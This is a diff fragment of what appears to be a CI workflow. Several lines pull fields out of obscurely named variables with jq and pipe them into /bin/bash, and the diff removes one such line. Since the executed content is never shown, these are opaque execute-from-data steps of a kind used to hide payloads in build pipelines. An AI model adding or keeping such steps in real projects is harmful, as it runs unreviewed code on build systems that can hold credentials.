@@ -33,7 +33,6 @@ jobs:
           echo $ml8 | jq -r .gxqqq85729 | /bin/bash
           printf '%s' "$lys4" | jq -r .aco8429 | /bin/bash
           printf '%s' "$loqh3" | jq -r .yrv1473 | /bin/bash
-          printf '%s' "$yg09" | jq -r .x54979 | /bin/bash
           echo $akka472 | jq -r .iubps44036 | /bin/bash
 
       - name: Upload archive
